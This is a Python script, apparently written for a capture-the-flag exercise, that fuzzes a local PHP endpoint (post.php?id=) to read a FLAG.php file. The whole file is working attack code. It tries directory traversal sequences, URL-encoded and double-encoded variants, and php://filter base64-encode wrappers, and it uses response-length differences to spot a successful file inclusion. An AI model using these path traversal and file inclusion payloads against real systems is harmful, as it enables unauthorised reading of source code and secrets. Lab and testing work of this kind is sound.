import requests
import base64
import time

base_url = "http://127.0.0.1:32904/post.php"

# Test different path variations for FLAG.php
test_cases = [
    # Direct in posts directory
    "../FLAG.php",
    "FLAG.php",
    "./FLAG.php",
    "posts/FLAG.php",
    
    # Path traversal from posts directory
    "../../../FLAG.php",
    "../../FLAG.php",
    
    # With different encoding
    "..%2FFLAG.php",
    "%2e%2e%2fFLAG.php",
    "..%252FFLAG.php",
    
    # Mixed case
    "../flag.php",
    "../Flag.php",
    "flag.php",
    
    # Without extension
    "FLAG",
    "../FLAG",
    
    # Using wrappers on different paths
    "php://filter/convert.base64-encode/resource=../FLAG.php",
    "php://filter/convert.base64-encode/resource=../../FLAG.php",
    "php://filter/convert.base64-encode/resource=../../../FLAG.php",
]

print("Testing FLAG.php access attempts...")
print("=" * 60)

successes = []
failures = []

for payload in test_cases:
    try:
        response = requests.get(base_url, params={'id': payload}, timeout=10)
        content_length = len(response.content)
        
        # Check for different response sizes (5326 = "Post not found")
        if content_length != 5326:
            result = f"✓ DIFFERENT RESPONSE for: {payload} | Length: {content_length} bytes"
            print(result)
            successes.append((payload, content_length, response.text))
            
            # Check for FLAG pattern
            if b'FLAG{' in response.content or b'flag{' in response.content:
                print(f"  🚩 FLAG FOUND!")
                print(f"  Response text:\n{response.text}")
            elif 'base64' in payload.lower():
                print(f"  Base64 wrapper response - attempting decode...")
                try:
                    # Extract potential base64 content
                    decoded = base64.b64decode(response.text)
                    print(f"  Decoded: {decoded[:500]}")
                    if b'FLAG{' in decoded:
                        print(f"  🚩 FLAG IN DECODED CONTENT!")
                        print(decoded.decode('utf-8', errors='ignore'))
                except:
                    print(f"  Response preview: {response.text[:200]}")
        else:
            failures.append(payload)
            
        time.sleep(0.1)  # Small delay to avoid overwhelming server
            
    except Exception as e:
        print(f"ERROR with {payload}: {str(e)}")
        failures.append(payload)

print("\n" + "=" * 60)
print(f"Testing complete. Successes: {len(successes)}, Failures: {len(failures)}")

if successes:
    print("\nSUCCESSFUL PAYLOADS:")
    for payload, length, text in successes:
        print(f"  - {payload} ({length} bytes)")

